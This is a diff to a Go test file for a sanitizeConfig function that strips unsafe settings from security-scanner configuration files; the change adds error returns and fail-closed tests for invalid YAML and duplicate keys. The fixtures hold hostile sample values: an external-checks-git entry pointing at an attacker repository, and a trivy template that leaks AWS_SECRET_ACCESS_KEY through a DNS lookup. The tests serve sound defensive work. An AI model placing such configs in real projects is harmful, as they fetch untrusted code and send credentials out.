@@ -240,7 +240,8 @@ skip-check:
 external-checks-git:
   - https://github.com/attacker/evil-checks
 `
-		got := sanitizeConfig(".checkov.yml", input)
+		got, err := sanitizeConfig(".checkov.yml", input)
+		assert.NoError(t, err)
 
 		assert.NotContains(t, got, "external-checks-git")
 		assert.Contains(t, got, "CKV_AWS_20")
@@ -248,7 +249,8 @@ external-checks-git:
 
 	t.Run("removes external-checks-git under the checkov-config.yaml filename too", func(t *testing.T) {
 		input := `external-checks-git: https://github.com/attacker/evil-checks`
-		got := sanitizeConfig("checkov-config.yaml", input)
+		got, err := sanitizeConfig("checkov-config.yaml", input)
+		assert.NoError(t, err)
 
 		assert.NotContains(t, got, "external-checks-git")
 	})
@@ -260,7 +262,8 @@ nested:
   external-checks-git: https://github.com/attacker/evil-checks
   keep-me: true
 `
-		got := sanitizeConfig(".checkov.yml", input)
+		got, err := sanitizeConfig(".checkov.yml", input)
+		assert.NoError(t, err)
 
 		assert.NotContains(t, got, "external-checks-git")
 		assert.Contains(t, got, "keep-me")
@@ -273,7 +276,8 @@ skip-check:
 framework:
   - terraform
 `
-		got := sanitizeConfig(".checkov.yml", input)
+		got, err := sanitizeConfig(".checkov.yml", input)
+		assert.NoError(t, err)
 
 		assert.Contains(t, got, "CKV_AWS_20")
 		assert.Contains(t, got, "terraform")
@@ -285,7 +289,8 @@ format: template
 template: '{{ getHostByName (env "AWS_SECRET_ACCESS_KEY") }}'
 severity: CRITICAL
 `
-		got := sanitizeConfig("trivy.yaml", input)
+		got, err := sanitizeConfig("trivy.yaml", input)
+		assert.NoError(t, err)
 
 		assert.NotContains(t, got, "getHostByName")
 		assert.Contains(t, got, "CRITICAL")
@@ -297,7 +302,8 @@ rules:
   - id: template-injection-check
     languages: [go]
 `
-		got := sanitizeConfig(".semgrep.yaml", input)
+		got, err := sanitizeConfig(".semgrep.yaml", input)
+		assert.NoError(t, err)
 
 		assert.Equal(t, input, got)
 	})
@@ -309,27 +315,41 @@ title = "gitleaks config"
 [[rules]]
 id = "aws-key"
 `
-		got := sanitizeConfig("gitleaks.toml", input)
+		got, err := sanitizeConfig("gitleaks.toml", input)
+		assert.NoError(t, err)
 
 		assert.Equal(t, input, got)
 	})
 
 	t.Run("passes through unknown config filenames unchanged", func(t *testing.T) {
 		input := `external-checks-git: https://github.com/attacker/evil-checks`
-		got := sanitizeConfig("some-other-file.yaml", input)
+		got, err := sanitizeConfig("some-other-file.yaml", input)
+		assert.NoError(t, err)
 
 		assert.Equal(t, input, got)
 	})
 
-	t.Run("does not choke on invalid yaml, returns original content", func(t *testing.T) {
+	t.Run("fails on invalid yaml instead of passing the content through", func(t *testing.T) {
 		input := `not: valid: yaml: at: all: {[`
-		got := sanitizeConfig(".checkov.yml", input)
+		_, err := sanitizeConfig(".checkov.yml", input)
 
-		assert.Equal(t, input, got)
+		assert.Error(t, err)
+	})
+
+	t.Run("fails on duplicate keys instead of passing the unsecure property through", func(t *testing.T) {
+		input := `
+external-checks-git: https://github.com/attacker/evil-checks
+framework: terraform
+framework: terraform
+`
+		_, err := sanitizeConfig(".checkov.yml", input)
+
+		assert.Error(t, err)
 	})
 
 	t.Run("does not choke on empty content", func(t *testing.T) {
-		got := sanitizeConfig(".checkov.yml", "")
+		got, err := sanitizeConfig(".checkov.yml", "")
+		assert.NoError(t, err)
 		assert.Equal(t, "", got)
 	})
 }
